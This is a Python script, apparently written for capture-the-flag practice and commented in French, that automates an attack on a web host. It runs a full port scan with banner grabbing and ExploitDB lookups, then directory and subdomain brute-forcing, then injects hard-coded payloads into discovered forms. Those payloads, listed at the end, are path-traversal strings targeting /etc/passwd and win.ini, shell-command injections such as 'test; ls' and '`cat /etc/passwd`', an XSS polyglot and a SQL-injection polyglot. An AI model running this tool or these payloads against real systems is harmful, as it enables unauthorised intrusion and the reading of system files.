import requests
import argparse
import os
import sys
import socket
from scapy.all import sr1, IP, TCP, conf
import time
from bs4 import BeautifulSoup
import re



def main():
    parser = argparse.ArgumentParser(description="Check the ReadMe on github : ")
    parser.add_argument("-u", "--url", type=str, required=True, help="IP or URL to scan.")
    parser.add_argument("-w", "--wordlist", type=str, required=True, help="Path to the wordlist file. ")

    args = parser.parse_args()

    base_url = args.url
    wordlist = args.wordlist

    host = base_url.replace("http://", "").replace("https://", "").split("/")[0]

    if not base_url.startswith("http://") and not base_url.startswith("https://"):
        base_url = "http://" + base_url

    try:

        scan_port(host)

        directories = dirbuster(base_url, wordlist)

        subdomain_scan(base_url, wordlist)

        vuln_scans(directories, base_url) #Scan pour Local File Inclusion, Command Injection, XSS et SQLi
        

    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user.")


    


#Pour l'esthétique
def print_banner(mode):
    print("\n")
    print("=" * 63)
    print(f"Starting in {mode} mode")
    print("=" * 63)



#Scan de tous les ports, avec détection de la version (pour certains ports), de l'OS (à améliorer) et recherche de vulnérabilité selon les versions trouvées
def scan_port(host):
    print_banner("Port Scan")

    ports = range(1, 65536) 
    total_ports = len(ports)  
    progress = 0  

    print(f"Scan on {host}...")
    results = []

    for port in ports:
        progress += 1 

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)

            result = s.connect_ex((host, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port, "tcp")
                except OSError:
                    service = "Unknown"

                version = banner_grabbing(host, port)

                results.append((port, service, version))

                print(f"[+] Port {port} open       Service : {service}       Version : {version if version else 'Unknown'}")
        except Exception as e:
            pass
        finally:
            s.close()

        # Barre de progression
        print(f"Progress: {progress} / {total_ports} ({(progress / total_ports) * 100:.2f}%)", end="\r")

    print_banner("Version Exploit")
    for port, service, version in results:
            exploit_url = search_exploitdb(version)
            if exploit_url:
                print(f"[!] Exploit found for port {port} ({service}, {version}) : {exploit_url}")
    if not exploit_url:
        print("[-] Nope")

    print_banner("OS Detection")
    print(detect_os(host))



def banner_grabbing(ip, port):
    
    #Effectue une tentative de récupération de bannière pour identifier la version du service. Il est à noter que ce n'est pas exhaustif. Je le remplirai plus tard. 
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((ip, port))

        if port == 80 or port == 8080:  
            return http_version_detection(ip, port)
        
        elif port == 21:  # FTP
            sock.send(b"HELP\r\n")
        elif port == 25:  # SMTP
            sock.send(b"EHLO example.com\r\n")
        elif port == 22:  # SSH (pas d'envoi nécessaire car la bannière est retrounée immédiatement en ssh)
            pass
        elif port == 110:  # POP3
            sock.send(b"CAPA\r\n")
        elif port == 143:  # IMAP
            sock.send(b"a1 CAPABILITY\r\n")

        banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
        return banner.split("\n")[0]
    except Exception:
        return ""
    finally:
        sock.close()
     
        

def http_version_detection(ip, port):
    
    #Uniquement pour les ports 80 et 8080
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((ip, port))

        http_requests = [
            b"OPTIONS / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: MyScanner\r\nAccept: */*\r\n\r\n",
            b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: MyScanner\r\nAccept: */*\r\n\r\n"
        ]

        for request in http_requests:
            sock.send(request)
            response = sock.recv(4096).decode("utf-8", errors="ignore")

            # Partie analyse des en-têtes pour trouver la version
            for line in response.split("\r\n"):
                if line.lower().startswith("server:"):
                    return line.split(":", 1)[1].strip()

        return "not found"
    except Exception:
        return "Error with detection"
    finally:
        sock.close()



def search_exploitdb(version):
    
    #L'idée est d'utiliser les résultats de la fonction précédente (qui donne les versions) pour effectuer des recherches sur ExploitDB et découvrir s'il y a une vulnérabilité existante. Possible amélioration : utiliser d'autres sites (et searchsploit)
    try:
        url = f"https://www.exploit-db.com/search?q={version}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200 and "exploit" in response.text.lower():
            return url
        return None
    except Exception:
        return None



def detect_os(ip):
    
    # Détection de l'OS basé sur des paquets TCP. Rudimentaire, donc à améliorer + ajouter une détection de la version de l'OS + recherche ExploitDB à partir de l'output
    try:
        pkt = IP(dst=ip) / TCP(dport=80, flags="S")  # Envoi d'un paquet SYN
        response = sr1(pkt, timeout=2, verbose=False)

        if response:
            ttl = response.ttl
            window_size = response.window

            # Approximation basée sur le Time To Live (TTL)
            if ttl <= 64:
                os = "Linux/Unix" #Pourquoi ce nombre ? Car c'est ce qui est renvoyé avec la commande "cat /proc/sys/net/ipv4/ip_default_ttl" (en général). On peut aussi utiliser Wireshark pour le constater
            elif ttl <= 128:
                os = "Windows" 
            else:
                os = "Unknown"

            return f"OS : {os} (TTL={ttl}, Window Size={window_size})"
        else:
            return "No response"
    except Exception as e:
        return f"Error : {e}"





def dirbuster(base_url, wordlist):
    print_banner("Directory Enumeration")
    total_lines = sum(1 for _ in open(wordlist, 'r'))
    progress = 0
    timeout = 1 
    extensions = ["", ".js", ".php"] #Teste par défaut les extensions javascript et php. Pas exhaustif mais suffisant pour la plupart des CTFs

    directories_found = []

    try:
        with open(wordlist, 'r') as file:
            for line in file:
                progress += 1
                base_directory = line.strip()

                for ext in extensions:
                    directory = f"{base_directory}{ext}"
                    url = f"{base_url}/{directory}"
                    try:
                        response = requests.get(url, allow_redirects=False, timeout=1)
                        status = response.status_code
                        if status not in [404]:
                            size = len(response.content)
                            location = response.headers.get("Location", "")
                            redirect = f"[--> {location}]" if location else ""
                            print(f"/{directory:<20} (Status: {status}) [Size: {size}] {redirect}")
                            directories_found.append(url)
                    except requests.Timeout:
                        pass
                    except requests.ConnectionError:
                        pass
                    except Exception as e:
                        print(f"[!] Error for {url}: {e}")
                
                print(f"Progress: {progress} / {total_lines} ({(progress / total_lines) * 100:.2f}%)", end="\r")
    except FileNotFoundError:
        print(f"[!] Wordlist file not found: {wordlist}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error during directory scan: {e}")
        
    return directories_found



def subdomain_scan(base_url, wordlist):
    print_banner("Subdomain Enumeration")
    base_domain = base_url.replace("http://", "").replace("https://", "").strip("/").split("/")[0]
    total_lines = sum(1 for _ in open(wordlist, 'r'))
    progress = 0
    timeout = 1 

    try:
        with open(wordlist, 'r') as file:
            for line in file:
                progress += 1
                subdomain = line.strip()
                url = f"http://{subdomain}.{base_domain}"
                try:
                    response = requests.get(url, allow_redirects=False, timeout=timeout)
                    status = response.status_code
                    if status not in [404]:
                        size = len(response.content)
                        location = response.headers.get("Location", "")
                        redirect = f"[--> {location}]" if location else ""
                        print(f"{subdomain:<20}.{base_domain:<20} (Status: {status}) [Size: {size}] {redirect}")
                except requests.Timeout:
                    pass
                except requests.ConnectionError:
                    pass
                except Exception as e:
                    print(f"[!] Error for {url}: {e}")
                
                print(f"Progress: {progress} / {total_lines} ({(progress / total_lines) * 100:.2f}%)", end="\r")
    except FileNotFoundError:
        print(f"[!] Wordlist file not found: {wordlist}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error during subdomain scan: {e}")





def vuln_scans(directories, base_url):
    print_banner("Starting Vuln Scans")

    if base_url not in directories:
        directories.insert(0, base_url)

    tested_forms = [] 
    scanned_urls = set() 

    for url in directories:
        if url in scanned_urls:
            continue 

        scanned_urls.add(url)

        print(f"\n===============================================================")
        print(f"Starting in Searching Forms mode ({url})")
        print(f"===============================================================\n")

        forms = detect_forms(url)
        if not forms:
            continue

        for i, form in enumerate(forms, start=1):
            form_id = str(form)
            if form_id in tested_forms:
                continue 
            tested_forms.append(form_id)

            print(f"[.] Form #{i} found on {url}:")
            inputs = form.find_all("input")
            for input_tag in inputs:
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                print(f"    Input - Name: {input_name}, Type: {input_type}")

            for test_type, payloads in [
                ("Command Injection", cmd_injection_payloads),
                ("LFI", lfi_payloads),
                ("XSS", xss_payloads),
                ("SQL Injection", sqli_payloads),
            ]:
                test_form_vulnerability(form, url, payloads, test_type)



def detect_forms(url):
    try:
        response = requests.get(url, timeout=1)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")

        print(f"[.] {len(forms)} form(s) detected.")
        return forms
    except Exception as e:
        print(f"[!] Error :  {e}")
        return []
    


def test_form_vulnerability(form, url, payloads, test_type):
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all("input")

    action_url = requests.compat.urljoin(url, action)

    param_name = None 

    if test_type == "LFI":
        data = {}
        for input_tag in inputs:
            name = input_tag.get("name")
            if name:
                data[name] = "test" 

        try:
            if method == "post":
                response = requests.post(action_url, data=data, timeout=1)
            else:
                response = requests.get(action_url, params=data, timeout=1)

            if "?" in response.url:
                match = re.search(r"\?(.*?)=test", response.url)
                if match:
                    param_name = match.group(1) 
                    
        except Exception as e:
            print(f"[!] Error while identifying parameter: {e}")

    if not param_name and test_type == "LFI":
        return False

    for payload in payloads:
        encoded_payload = payload.replace("//", "%2F%2F")  
        
        injected_url = f"{action_url.split('?')[0]}?{param_name}={encoded_payload}"
        
        try:
            response = requests.get(injected_url, timeout=1)

            if test_type == "LFI" and ("root:x:" in response.text or "[boot loader]" in response.text):
                print(f"[+] Possible {test_type} detected with payload: {payload}")
                print(f"    URL: {injected_url}")
                return True

        except Exception as e:
            print(f"[!] Error with payload {payload}: {e}")  
            
            
    if test_type == "Command Injection":
        data = {}
        for input_tag in inputs:
            name = input_tag.get("name")
            if name:
                data[name] = "test" 

        try:
            if method == "post":
                response = requests.post(action_url, data=data, timeout=1)
            else:
                response = requests.get(action_url, params=data, timeout=1)

            if "?" in response.url:
                match = re.search(r"\?(.*?)=test", response.url)
                if match:
                    param_name = match.group(1)  
                    print(f"[.] Possible vulnerable parameter identified: {param_name}")
                    
        except Exception as e:
            print(f"[!] Error while identifying parameter: {e}")

    if not param_name and test_type == "Command Injection":
        return False

    for payload in payloads:
        data = {}
        for input_tag in inputs:
            name = input_tag.get("name")
            if name:
                if test_type == "Command Injection" and param_name == name:
                    data[name] = payload
                elif test_type != "Command Injection":
                    data[name] = payload     


        try:
            if method == "post":
                response = requests.post(action_url, data=data, timeout=1)
            else:
                response = requests.get(action_url, params=data, timeout=1)
                
            if test_type == "Command Injection" and ("uid=" in response.text or "root:" in response.text):
                print(f"[+] Possible {test_type} detected with payload: {payload}")
                print(f"    URL: {response.url}")
                return True

            if test_type == "XSS" and payload in response.text:
                print(f"[+] Possible {test_type} detected with payload: {payload}")
                print(f"    URL: {response.url}")
                return True

            if test_type == "SQL Injection" and ("sql" in response.text.lower() or "error" in response.text.lower()):
                print(f"[+] Possible {test_type} detected with payload: {payload}")
                print(f"    URL: {response.url}")
                return True

        except Exception as e:
            print(f"[!] Error with payload {payload} : {e}")

    return False



#Pour LFI et Command injections, payloads normales. Pour XSS et SQLi, utilisations de polyglots.

lfi_payloads = [                         #Wordlist rudimentaire, mais suffisante pour les CTFs. (Donc possibilité d'amélioration = étoffer la wordlist, par exemple : https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt )
    "../../etc/passwd", 
    "../../../etc/passwd",  
    "../../../../etc/passwd",  
    "../../../../etc/passwd%00",  
    "....//....//....//etc/passwd",  
    "....//....//....//....//etc/passwd%00",  
    "../../../../windows/win.ini",  
    "../../../../boot.ini",  
]
    
cmd_injection_payloads = [                #Idem, possible d'étoffer la wordlist (par exemple : https://github.com/payloadbox/command-injection-payload-list ) mais suffisant pour les CTFs.
    "test; ls", "test && whoami", "test | id", "`cat /etc/passwd`", "$(ls)", "${whoami}",
     "test & dir", "test | echo %username%", "| ipconfig"
]

xss_payloads = [                          #Polyglot donné dans un module de TryHackMe : https://tryhackme.com/r/room/xss (Task 7, dernière ligne) 
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e"
]


sqli_payloads = [                        #Polyglot créé par LightOS dans sa Blackhat presentation de 2013
    "OR 1#\"OR\"'OR''='\"=\"'OR''='",
]





if __name__ == "__main__":
    main()
